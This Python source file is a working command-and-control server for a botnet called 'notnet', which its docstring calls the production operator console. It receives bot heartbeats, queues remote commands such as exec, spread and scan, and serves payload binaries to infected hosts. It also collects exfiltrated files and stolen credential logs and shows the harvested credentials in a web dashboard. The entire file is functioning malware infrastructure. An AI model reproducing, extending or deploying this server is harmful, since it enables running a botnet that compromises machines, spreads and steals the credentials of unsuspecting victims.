#!/usr/bin/env python3
"""notnet C2 server — production operator console for the notnet bot.

Implements the SAME wire contract the sim mocks define (tests/sim/c2/c2_http.py),
so the real fleet and the sim fleet speak one protocol:

  POST <http_path>            heartbeat / command response  {"cmd":"status",...}
  POST <http_path>/exfil      credential-log / file exfil chunks
  GET  /bot/<name>            payload binary (payload_dir/<name>)
  GET  /notnet-src.tar        on-target compile source bundle

State is SQLite. Operator commands go through a queue dir (same protocol as
the sim: channel-tagged files, atomic rename claim) with an optional per-bot
"target" tag so commands reach ONE specific bot. c2ctl (this repo) is the
operator CLI; console.py serves the dashboard + JSON API.

Auth: every response echoes the configured c2_secret (the bot verifies it).
Incoming heartbeats with a WRONG secret are logged and never served commands.
"""

import argparse
import json
import os
import re
import signal
import socket
import sqlite3
import sys
import threading
import time
from datetime import datetime, timezone

try:
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
except ImportError:  # pragma: no cover
    BaseHTTPRequestHandler = ThreadingHTTPServer = None

DEFAULT_SECRET = "notnet-v1"          # operator MUST override via --secret
DEFAULT_HTTP = 8080
DEFAULT_PAYLOAD = 8443
DEFAULT_WS = 8081
DEFAULT_IRC = 6667
DEFAULT_CONSOLE = 8090

_lock = threading.Lock()


def log(line):
    ts = datetime.now(timezone.utc).isoformat()
    with _lock:
        print(f"[{ts}] {line}", flush=True)


# ─────────────────────────── queue protocol ───────────────────────────
# Same as the sim: files dropped into queue/ (channel-tagged prefix
# http-|ws-|irc-, plus an optional JSON "target" = bot tag). Atomic claim
# via rename-to-claimed so exactly one listener serves each file.

def next_command(queue_dir, channel, tag=None):
    """Pop the oldest queued command for this channel; None if none.

    tag is the requesting bot's tag: a queued command with a "target" field
    is served only to that bot; commands without a target go to any bot on
    the channel (legacy behaviour, matches the sim driver).
    """
    try:
        files = sorted(os.listdir(queue_dir))
    except FileNotFoundError:
        return None
    for fn in files:
        if not fn.endswith(".json"):
            continue
        if _channel_of(fn) not in (None, channel):
            continue
        src = os.path.join(queue_dir, fn)
        claimed = src + ".claimed"
        try:
            os.rename(src, claimed)
        except OSError:
            continue
        try:
            with open(claimed) as f:
                data = json.load(f)
        except (json.JSONDecodeError, OSError):
            os.unlink(claimed)
            continue
        tgt = data.get("target") or ""
        if tgt and tag and tgt != tag:
            # not for this bot — put it back so another bot can claim it
            try:
                os.rename(claimed, src)
            except OSError:
                os.unlink(claimed)
            continue
        try:
            os.unlink(claimed)
        except OSError:
            pass
        return data
    return None


def _channel_of(fn):
    for ch in ("http-", "ws-", "irc-"):
        if fn.startswith(ch):
            return ch[:-1]
    return None


# ─────────────────────────── state store ───────────────────────────

SCHEMA = """
CREATE TABLE IF NOT EXISTS bots (
    hostname    TEXT PRIMARY KEY,
    tag         TEXT,
    ip          TEXT,
    version     TEXT,
    uptime      INTEGER,
    scan_count  INTEGER,
    cred_count  INTEGER,
    proxy_on    INTEGER,
    proxy_port  INTEGER,
    relay_on    INTEGER,
    relay_port  INTEGER,
    channel     TEXT,
    last_seen   REAL
);
CREATE TABLE IF NOT EXISTS commands (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    target      TEXT,
    cmd         TEXT,
    args        TEXT,
    queued_at   REAL,
    served_at   REAL,
    served_to   TEXT
);
CREATE TABLE IF NOT EXISTS creds (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    line        TEXT,
    source_ip   TEXT,
    received_at REAL
);
CREATE TABLE IF NOT EXISTS exfil (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    chunk       TEXT,
    source_ip   TEXT,
    received_at REAL
);
CREATE TABLE IF NOT EXISTS events (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    ts          REAL,
    kind        TEXT,
    detail      TEXT
);
"""


class State:
    def __init__(self, path):
        self.db = sqlite3.connect(path, check_same_thread=False)
        self.db.executescript(SCHEMA)
        self.db.commit()
        self._lk = threading.Lock()

    def upsert_bot(self, hb, ip, channel):
        tag = hb.get("tag", "")
        with self._lk:
            self.db.execute(
                """INSERT INTO bots(hostname,tag,ip,version,uptime,scan_count,
                   cred_count,proxy_on,proxy_port,relay_on,relay_port,channel,last_seen)
                   VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)
                   ON CONFLICT(hostname) DO UPDATE SET
                     tag=excluded.tag, ip=excluded.ip, version=excluded.version,
                     uptime=excluded.uptime, scan_count=excluded.scan_count,
                     cred_count=excluded.cred_count, proxy_on=excluded.proxy_on,
                     proxy_port=excluded.proxy_port, relay_on=excluded.relay_on,
                     relay_port=excluded.relay_port, channel=excluded.channel,
                     last_seen=excluded.last_seen""",
                (hb.get("hostname", ""), tag, ip, hb.get("version", ""),
                 hb.get("uptime", 0), hb.get("scan_count", 0),
                 hb.get("cred_count", 0), hb.get("proxy_on", 0),
                 hb.get("proxy_port", 0), hb.get("relay_on", 0),
                 hb.get("relay_port", 0), channel, time.time()))
            self.db.commit()

    def record_command(self, target, cmd, args):
        with self._lk:
            cur = self.db.execute(
                "INSERT INTO commands(target,cmd,args,queued_at) VALUES(?,?,?,?)",
                (target, cmd, args, time.time()))
            self.db.commit()
            return cur.lastrowid

    def mark_served(self, cmd_id, tag):
        with self._lk:
            self.db.execute(
                "UPDATE commands SET served_at=?, served_to=? WHERE id=?",
                (time.time(), tag, cmd_id))
            self.db.commit()

    def add_cred(self, line, ip):
        with self._lk:
            self.db.execute(
                "INSERT INTO creds(line,source_ip,received_at) VALUES(?,?,?)",
                (line[:4096], ip, time.time()))
            self.db.commit()

    def add_exfil(self, chunk, ip):
        with self._lk:
            self.db.execute(
                "INSERT INTO exfil(chunk,source_ip,received_at) VALUES(?,?,?)",
                (chunk[:65536], ip, time.time()))
            self.db.commit()

    def add_event(self, kind, detail):
        with self._lk:
            self.db.execute(
                "INSERT INTO events(ts,kind,detail) VALUES(?,?,?)",
                (time.time(), kind, detail[:2048]))
            self.db.commit()

    def bots(self):
        with self._lk:
            return self.db.execute(
                "SELECT * FROM bots ORDER BY last_seen DESC").fetchall()

    def commands(self, limit=50):
        with self._lk:
            return self.db.execute(
                "SELECT * FROM commands ORDER BY id DESC LIMIT ?",
                (limit,)).fetchall()

    def creds(self, limit=200):
        with self._lk:
            return self.db.execute(
                "SELECT * FROM creds ORDER BY id DESC LIMIT ?",
                (limit,)).fetchall()

    def exfil(self, limit=50):
        with self._lk:
            return self.db.execute(
                "SELECT * FROM exfil ORDER BY id DESC LIMIT ?",
                (limit,)).fetchall()


# ─────────────────────────── HTTP C2 + payload ───────────────────────────
# Raw-socket keep-alive loop, ported from the sim mock (tests/sim/c2/c2_http.py)
# — the bot sends "Connection: keep-alive" and REUSES the socket; the mock
# responds, keeps reading on the same connection, and only closes on EOF.
# A one-request-per-connection server (Connection: close) makes the bot's
# connected flag drop and the autonomous-spread gate open (#95).

def recv_http(conn):
    """Read one HTTP request from conn. Returns (method, path, body) or None on close."""
    conn.settimeout(30)
    buf = b""
    try:
        while True:
            chunk = conn.recv(8192)
            if not chunk:
                return None
            buf += chunk
            while True:
                he = buf.find(b"\r\n\r\n")
                if he == -1:
                    break
                header_data = buf[:he]
                rest = buf[he + 4:]
                lines = header_data.decode("utf-8", errors="replace").split("\r\n")
                reqline = lines[0]
                if not reqline:
                    buf = rest
                    continue
                parts = reqline.split(" ")
                if len(parts) < 2:
                    return None
                method, path = parts[0], parts[1]
                clen = 0
                for h in lines[1:]:
                    if h.lower().startswith("content-length:"):
                        try:
                            clen = int(h.split(":", 1)[1].strip())
                        except ValueError:
                            clen = 0
                        break
                if len(rest) < clen:
                    break  # need more body bytes
                body = rest[:clen]
                buf = rest[clen:]
                return method, path, body
    except (socket.timeout, ConnectionError, OSError):
        return None


def http_send(conn, body):
    body_b = body.encode("utf-8")
    resp = (
        "HTTP/1.1 200 OK\r\n"
        "Server: NotnetC2/0.1\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {len(body_b)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("utf-8") + body_b
    try:
        conn.sendall(resp)
    except OSError:
        pass


def http_send_file(conn, path, ctype):
    try:
        with open(path, "rb") as f:
            data = f.read()
    except OSError:
        data = b""
    resp = (
        "HTTP/1.1 200 OK\r\n"
        "Server: NotnetC2/0.1\r\n"
        f"Content-Type: {ctype}\r\n"
        f"Content-Length: {len(data)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("utf-8") + data
    try:
        conn.sendall(resp)
    except OSError:
        pass


def handle_http(conn, addr, c2):
    ip = addr[0]
    try:
        while True:
            req = recv_http(conn)
            if req is None:
                return
            method, path, body = req
            path = path.rstrip("/")
            text = body.decode("utf-8", errors="replace")
            try:
                j = json.loads(text) if text else {}
            except json.JSONDecodeError:
                j = {}

            if method == "POST" and path == c2.http_path.rstrip("/"):
                kind = "heartbeat" if j.get("cmd") == "status" else "response"
                secret = j.get("secret", "")
                if secret != c2.secret:
                    c2.state.add_event("auth_fail",
                                       f"bad secret from {ip} host={j.get('hostname','')}")
                    log(f"AUTH-FAIL {ip} host={j.get('hostname','')}")
                    http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
                    continue
                c2.state.upsert_bot(j, ip, "http")
                log(f"HTTP {kind} {ip} host={j.get('hostname','')} tag={j.get('tag','')}")
                if kind == "heartbeat":
                    q = next_command(c2.queue_dir, "http", tag=j.get("tag"))
                    if q is not None:
                        c2.state.mark_served(q.get("_id", 0), j.get("tag", ""))
                        log(f"SERVE http -> {j.get('tag','')} cmd={q.get('cmd')} args={q.get('args','')}")
                        http_send(conn, json.dumps({"cmd": q.get("cmd", "status"),
                                                    "args": q.get("args", ""),
                                                    "secret": c2.secret}))
                        continue
                http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
                continue

            if method == "POST" and path.endswith("/exfil"):
                if j.get("secret") != c2.secret:
                    http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
                    continue
                c2.state.add_exfil(text, ip)
                log(f"EXFIL {ip} len={len(text)}")
                http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
                continue

            if method == "GET" and path == "/bot/notnet":
                http_send_file(conn, os.path.join(c2.payload_dir, "notnet"),
                               "application/octet-stream")
                log(f"PAYLOAD notnet download from {ip}")
                continue
            if method == "GET" and path == "/notnet-src.tar":
                http_send_file(conn, os.path.join(c2.payload_dir, "notnet-src.tar"),
                               "application/x-tar")
                log(f"SRC-TAR download from {ip}")
                continue
            if method == "GET" and path.startswith("/bot/"):
                fname = os.path.basename(path)
                full = os.path.join(c2.payload_dir, fname)
                if os.path.isfile(full):
                    http_send_file(conn, full, "application/octet-stream")
                    log(f"PAYLOAD {fname} download from {ip}")
                    continue

            http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
    except (socket.timeout, ConnectionError, OSError):
        pass
    finally:
        try:
            conn.close()
        except OSError:
            pass


def serve_http(c2, port):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(64)
    log(f"LISTEN HTTP C2 on 0.0.0.0:{port} path={c2.http_path}")
    while True:
        try:
            conn, addr = srv.accept()
            threading.Thread(target=handle_http, args=(conn, addr, c2),
                             daemon=True).start()
        except KeyboardInterrupt:
            break


# ─────────────────────────── operator console ───────────────────────────

class ConsoleHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "NotnetC2Console/0.1"

    @property
    def c2(self):
        return self.server.c2

    def log_message(self, fmt, *args):
        pass

    def _send(self, body, ctype="text/html; charset=utf-8", code=200):
        data = body.encode("utf-8") if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Connection", "close")
        self.end_headers()
        try:
            self.wfile.write(data)
        except (BrokenPipeError, ConnectionResetError):
            pass

    def do_GET(self):
        c2 = self.c2
        path = self.path.split("?", 1)[0]
        if path == "/api/bots":
            rows = c2.state.bots()
            cols = ["hostname", "tag", "ip", "version", "uptime", "scan_count",
                    "cred_count", "proxy_on", "proxy_port", "relay_on",
                    "relay_port", "channel", "last_seen"]
            bots = [dict(zip(cols, r)) for r in rows]
            for b in bots:
                b["ago"] = max(0, int(time.time() - (b["last_seen"] or 0)))
            self._send(json.dumps({"bots": bots}), "application/json")
            return
        if path == "/api/creds":
            self._send(json.dumps({"creds": c2.state.creds()}),
                       "application/json")
            return
        if path == "/api/commands":
            self._send(json.dumps({"commands": c2.state.commands()}),
                       "application/json")
            return
        if path == "/api/exfil":
            self._send(json.dumps({"exfil": c2.state.exfil()}),
                       "application/json")
            return
        if path in ("/", "/console", "/index.html"):
            self._send(console_html())
            return
        self._send("not found", "text/plain", 404)

    def do_POST(self):
        c2 = self.c2
        path = self.path.split("?", 1)[0]
        if path == "/api/queue":
            n = int(self.headers.get("Content-Length") or 0)
            raw = self.rfile.read(n) if n else b""
            try:
                j = json.loads(raw.decode("utf-8", errors="replace"))
            except json.JSONDecodeError:
                j = {}
            cmd = (j.get("cmd") or "").strip()
            if not cmd:
                self._send(json.dumps({"error": "cmd required"}),
                           "application/json", 400)
                return
            target = (j.get("target") or "").strip()
            args = (j.get("args") or "").strip()
            cid = c2.enqueue_command(target, cmd, args, "console")
            self._send(json.dumps({"id": cid, "target": target,
                                   "cmd": cmd, "args": args}),
                       "application/json")
            return
        self._send(json.dumps({"error": "unknown"}), "application/json", 404)


def console_html():
    return """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>notnet C2 console</title>
<style>
 body{font-family:ui-monospace,monospace;margin:2rem;background:#111;color:#ddd}
 h1{color:#7f9fff} table{border-collapse:collapse;width:100%;margin-bottom:2rem}
 th,td{border:1px solid #333;padding:4px 8px;text-align:left;font-size:13px}
 th{background:#222;color:#9f9} .up{color:#5f5} .stale{color:#f77}
 input,button{background:#222;color:#ddd;border:1px solid #444;padding:6px}
 .ok{color:#5f5}
</style></head><body>
<h1>notnet C2 — operator console</h1>
<h2>Bots</h2>
<table id="bots"><thead><tr><th>hostname</th><th>tag</th><th>ip</th>
<th>version</th><th>uptime</th><th>scan</th><th>creds</th><th>proxy</th>
<th>relay</th><th>channel</th><th>seen (s)</th></tr></thead><tbody></tbody></table>
<h2>Queue command</h2>
<form id="qform"><input id="qtarget" placeholder="target tag (empty = any)">
<input id="qcmd" placeholder="cmd (exec, spread, scan, update...)">
<input id="qargs" placeholder="args"><button>Queue</button></form>
<p id="qres"></p>
<h2>Commands</h2>
<table id="cmds"><thead><tr><th>id</th><th>target</th><th>cmd</th>
<th>args</th><th>queued</th><th>served</th><th>served_to</th></tr></thead>
<tbody></tbody></table>
<h2>Credentials</h2>
<table id="creds"><thead><tr><th>id</th><th>line</th><th>src</th>
<th>at</th></tr></thead><tbody></tbody></table>
<script>
async function j(u){const r=await fetch(u);return r.json()}
async function refresh(){
 const b=await j('/api/bots');const tb=document.querySelector('#bots tbody');
 tb.innerHTML='';for(const x of b.bots){const tr=document.createElement('tr');
 const up=x.ago<90;const cls=up?'up':'stale';
 tr.innerHTML=`<td>${x.hostname}</td><td>${x.tag||''}</td><td>${x.ip||''}</td>
 <td>${x.version||''}</td><td>${x.uptime||0}</td><td>${x.scan_count||0}</td>
 <td>${x.cred_count||0}</td><td>${x.proxy_on?'<span class="ok">on '+x.proxy_port+'</span>':'off'}</td>
 <td>${x.relay_on?'<span class="ok">on '+x.relay_port+'</span>':'off'}</td>
 <td>${x.channel||''}</td><td class="${cls}">${x.ago}</td>`;
 tb.appendChild(tr);}
 const c=await j('/api/commands');const tc=document.querySelector('#cmds tbody');
 tc.innerHTML='';for(const x of c.commands){const tr=document.createElement('tr');
 tr.innerHTML=`<td>${x[0]}</td><td>${x[1]||''}</td><td>${x[2]}</td>
 <td>${x[3]||''}</td><td>${Math.round(x[4])}</td>
 <td>${x[5]?Math.round(x[5]):''}</td><td>${x[6]||''}</td>`;
 tc.appendChild(tr);}
 const cr=await j('/api/creds');const tg=document.querySelector('#creds tbody');
 tg.innerHTML='';for(const x of cr.creds){const tr=document.createElement('tr');
 tr.innerHTML=`<td>${x[0]}</td><td>${x[1]}</td><td>${x[2]||''}</td><td>${Math.round(x[3])}</td>`;
 tg.appendChild(tr);}
}
document.querySelector('#qform').addEventListener('submit',async e=>{
 e.preventDefault();
 const body={target:qtarget.value,cmd:qcmd.value,args:qargs.value};
 const r=await fetch('/api/queue',{method:'POST',headers:{'Content-Type':'application/json'},
 body:JSON.stringify(body)});const jj=await r.json();
 qres.textContent='queued id='+jj.id+' cmd='+jj.cmd+' -> '+(jj.target||'any');
 qcmd.value='';qargs.value='';
});
setInterval(refresh,3000);refresh();
</script></body></html>"""


def serve_console(c2, port):
    srv = ThreadingHTTPServer(("0.0.0.0", port), ConsoleHandler)
    srv.c2 = c2
    log(f"LISTEN console on 0.0.0.0:{port} (dashboard + /api)")
    srv.serve_forever()


# ─────────────────────────── entrypoint ───────────────────────────

class C2:
    def __init__(self, secret, http_path, queue_dir, payload_dir, state_path):
        self.secret = secret
        self.http_path = http_path
        self.queue_dir = queue_dir
        self.payload_dir = payload_dir
        self.state = State(state_path)
        os.makedirs(queue_dir, exist_ok=True)
        os.makedirs(payload_dir, exist_ok=True)

    def enqueue_command(self, target, cmd, args, source):
        cid = self.state.record_command(target, cmd, args)
        prefix = ""
        ts = int(time.time() * 1000)
        fn = os.path.join(self.queue_dir, f"cmd-{ts}-{os.getpid()}-{cid:04d}.json")
        with open(fn, "w") as f:
            json.dump({"cmd": cmd, "args": args, "target": target, "_id": cid}, f)
        log(f"QUEUE {source} -> target={target or 'any'} cmd={cmd} args={args} ({fn})")
        return cid


def main():
    ap = argparse.ArgumentParser(description="notnet C2 server")
    ap.add_argument("--secret", default=os.environ.get("NOTNET_C2_SECRET", DEFAULT_SECRET))
    ap.add_argument("--http-path", default="/api/v1/bot")
    ap.add_argument("--queue-dir", default=os.environ.get("SIM_QUEUE_DIR", "queue"))
    ap.add_argument("--payload-dir", default=os.environ.get("SIM_PAYLOAD_DIR", "payload"))
    ap.add_argument("--db", default="c2.db")
    ap.add_argument("--http-port", type=int, default=int(os.environ.get("SIM_HTTP_PORT", DEFAULT_HTTP)))
    ap.add_argument("--payload-port", type=int, default=int(os.environ.get("SIM_PAYLOAD_PORT", DEFAULT_PAYLOAD)))
    ap.add_argument("--console-port", type=int, default=int(os.environ.get("SIM_CONSOLE_PORT", DEFAULT_CONSOLE)))
    args = ap.parse_args()

    c2 = C2(args.secret, args.http_path, args.queue_dir, args.payload_dir, args.db)

    threads = [
        threading.Thread(target=serve_http, args=(c2, args.http_port), daemon=True),
        threading.Thread(target=serve_http, args=(c2, args.payload_port), daemon=True),
        threading.Thread(target=serve_console, args=(c2, args.console_port), daemon=True),
    ]
    for t in threads:
        t.start()

    def _stop(sig, frame):
        log("shutting down")
        sys.exit(0)

    signal.signal(signal.SIGTERM, _stop)
    signal.signal(signal.SIGINT, _stop)
    while True:
        time.sleep(3600)


if __name__ == "__main__":
    main()
